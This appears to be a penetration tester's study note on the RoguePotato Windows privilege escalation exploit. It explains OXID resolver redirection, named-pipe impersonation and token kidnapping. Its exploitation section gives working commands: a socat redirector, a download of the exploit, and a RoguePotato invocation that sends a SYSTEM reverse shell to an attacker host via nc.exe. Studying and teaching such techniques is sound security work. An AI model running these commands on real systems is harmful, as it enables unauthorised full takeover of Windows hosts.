---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
## RoguePotato

> **[RoguePotato](https://github.com/antonioCoco/RoguePotato)** is a local privilege escalation exploit that bypasses the Windows 10 `1809` OXID resolution restriction by redirecting OXID queries to a remote fake OXID Resolver, ultimately capturing a `SYSTEM` token via named pipe impersonation.

> [!warning]+ Compatibility
> - Designed for **Windows 10 `1809`+** and **Windows Server 2019** (where [[JuicyPotato]] is mitigated).
> - Requires `SeImpersonatePrivilege`.
> - Requires a **remote machine** (attacker-controlled) reachable by the target on **port `135`**, or a port-forwarding redirector.

- Attempt RoguePotato if:
	- You have code execution as a **service account** with **`SeImpersonatePrivilege`**.
	- The target is running **Windows 10 `1809`+** / **Windows Server 2019** (JuicyPotato mitigated).
	- The **Print Spooler** is disabled (otherwise [[PrintSpoofer]] is simpler).
	- You have a **remote machine** the target can reach on port `135`.

- Verify current privileges:

```powershell
whoami /priv
```

>[!note] See [[Windows privileges#`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`]] for which accounts hold this privilege by default.

- Check if you can reach machine under your control from the target system on port `135`:

```powershell
Test-NetConnection -ComputerName <attacker_ip_address> -Port 135
```

```powershell
telnet <attacker_ip_address> 135
```

![[JuicyPotato#What changed after JuicyPotato]]


- If [[PrintSpoofer]] doesn't use COM/DCOM activation at all to bypass this, RoguePotato takes a different approach: **if local OXID resolution is restricted, perform it remotely**.
- A remote OXID Resolver is not subject to the local port restriction — and the response can redirect `RPCSS` back to a local named pipe under the attacker's control.

## How RoguePotato works

RoguePotato chains five steps to escalate from a service account to `SYSTEM`:

1. **Trigger DCOM activation with a remote OXID reference**
	- RoguePotato calls a COM activation API (e.g., `CoGetInstanceFromIStorage()`) with a custom-marshaled `OBJREF`, just like JuicyPotato.
	- The difference: the `OBJREF` binding strings point to a **remote attacker-controlled IP** instead of `127.0.0.1`.
	- `RPCSS` sees a remote OXID reference and sends the `ResolveOxid2` request to the remote IP on port `135`.

> [!note] See [[🛠️ COM, DCOM, and RPC#OXID resolution]] for how OXID resolution works and why the remote path bypasses the local restriction.

2. **Redirect to the fake OXID Resolver**
	- On the attacker's remote machine, a **redirector** (typically `socat`) listens on port `135` and forwards the incoming `ResolveOxid2` request to a **fake OXID Resolver** — an RPC server that implements the `IObjectExporter` interface.
	- The fake OXID Resolver can run on the remote machine or on the victim itself (on a port other than `135`).

3. **Return poisoned binding strings**
	- The fake OXID Resolver responds to `ResolveOxid2` with **crafted RPC binding strings**. Instead of using `ncacn_ip_tcp` (TCP), it returns:

```
ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]
```

- This uses the same **`/`-in-hostname path normalization trick** from [[PrintSpoofer]]: Windows normalizes the `/` to `\`, turning the path into `\\localhost\pipe\roguepotato\pipe\epmapper`.
- RoguePotato has already created a named pipe listener at `\\.\pipe\roguepotato\pipe\epmapper`.

> [!important] The named pipe must end with `\pipe\epmapper` because, by protocol design, DCOM RPC over named pipes always connects to the `epmapper` pipe. RoguePotato works around this by making `epmapper` a suffix of a path it controls.

4. **Capture the `NETWORK SERVICE` token from `RPCSS`**
	- `RPCSS` connects to the poisoned named pipe to perform the `IRemUnknown2` interface call.
	- RoguePotato calls `ImpersonateNamedPipeClient()` on the incoming connection.
	- The captured token belongs to **`NETWORK SERVICE`** — the account under which `RPCSS` runs — but it carries the **LUID (Logon ID) of the `RPCSS` process**, which hosts `SYSTEM`-level tokens.

> [!note] See [[🛠️ Named pipes#Named pipe impersonation]] for how named pipe impersonation works.

5. **Token Kidnapping → `SYSTEM`**
	- With the `NETWORK SERVICE` impersonation token (carrying the `RPCSS` LUID), RoguePotato enumerates handles in the **`rpcss` process**.
	- It locates token handles belonging to `NT AUTHORITY\SYSTEM` and duplicates them.
	- It then spawns a new process under the stolen `SYSTEM` primary token using `CreateProcessWithTokenW()` or `CreateProcessAsUserW()`.

> [!note] This final step is the classic **Token Kidnapping** technique: because `RPCSS` runs in the same logon session as `NETWORK SERVICE` and hosts multiple `SYSTEM` tokens, an impersonated `NETWORK SERVICE` thread can access those tokens through handle duplication.

> [!note] See [[🛠️ Access tokens and impersonation#Token duplication]] for details on token conversion.

## Exploitation

- Before starting the attack, set up a redirector on your controlled machine using . It should redirect port `135` to the fake OXID resolver running on the target:

```bash
socat tcp-listen:135,reuseaddr,fork tcp:<target_ip_address>:9999
```

- So, the `RPCSS` on the target makes OXID resolution requests to port `135` on your controlled machine, and that port redirects the requests **back to the target itself** to port `9999`. That `9999` port is where RoguePotato's fake OXID resolver listens.



### Run RoguePotato on the target

- Get the **[RoguePotato exploit](https://github.com/antonioCoco/RoguePotato)**:

```bash
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
```

- Spawn a reverse shell as `SYSTEM`:

```powershell
RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c nc.exe <attacker_ip> <port> -e cmd.exe" -l 9999
```

- Spawn an interactive `cmd.exe`:

```powershell
RoguePotato.exe -r <attacker_ip> -c "{B91D5831-B1FC-4019-A484-E3AE6F8640D3}" -e "cmd.exe" -l 9999
```

### Option reference

| Option | Description |
| --- | --- |
| `-r` (required) | IP of the remote machine running the redirector. |
| `-e` (required) | Command to execute as `SYSTEM`. |
| `-l` | Local port for the fake OXID Resolver (default: `9999`). |
| `-c` | CLSID to use for COM activation (default: built-in). |
| `-p` | Named pipe name (default: `roguepotato`). |
| `-z` | Randomize pipe name. |

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| No connection on port `135` of the redirector | Ensure the target can reach your attacker IP on port `135`. Check firewalls. |
| Token is `Identification` level (useless) | The OXID resolution went through the local resolver instead of remote. Verify the `-r` flag points to your external IP. |
| `NETWORK SERVICE` token obtained but no `SYSTEM` process | Token Kidnapping failed — the `rpcss` process may not hold a usable `SYSTEM` handle. Try a different CLSID with `-c`. |

## References and further reading

- [`RoguePotato — GitHub (antonioCoco)`](https://github.com/antonioCoco/RoguePotato)
- [`No more JuicyPotato? Old story, welcome RoguePotato! — Decoder's Blog`](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [`From NETWORK SERVICE to SYSTEM — Decoder's Blog`](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [`Token Kidnapping — Cesar Cerrudo (PacketStorm)`](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [`Potatoes — Windows Privilege Escalation — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [`IObjectExporter interface — Microsoft Learn`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/8ed0ae33-56a1-44b7-979f-5972f0e9416c)
